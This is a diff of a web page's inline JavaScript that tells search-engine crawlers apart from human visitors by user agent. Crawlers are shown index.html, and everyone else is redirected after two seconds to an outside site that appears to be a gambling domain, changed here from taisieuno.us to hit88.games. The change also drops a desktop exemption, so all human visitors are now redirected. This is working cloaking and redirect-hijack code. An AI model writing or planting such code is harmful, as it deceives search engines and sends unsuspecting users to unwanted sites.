@@ -58,7 +58,7 @@
     </div>
 
     <script>
-        function isBotOrDesktop() {
+        function isBot() {
             const userAgent = navigator.userAgent.toLowerCase();
             const botList = [
                 'googlebot',           // Google Search Engine Crawler
@@ -73,18 +73,15 @@
                 'google image proxy'   // Google Image Proxy
             ];
 
-            const isBot = botList.some(bot => userAgent.includes(bot));
-            const isDesktop = window.innerWidth > 1024;
-
-            return isBot || isDesktop;
+            return botList.some(bot => userAgent.includes(bot));
         }
 
-        if (!isBotOrDesktop()) {
+        if (!isBot()) {
             setTimeout(function() {
-                window.location.href = "https://taisieuno.us/game/";
+                window.location.href = "https://hit88.games/";
             }, 2000);
         } else {
-            // Chuyển hướng bot hoặc desktop về trang index.html
+            // Chuyển hướng bot về trang index.html
             window.location.href = "index.html";
         }
     </script>
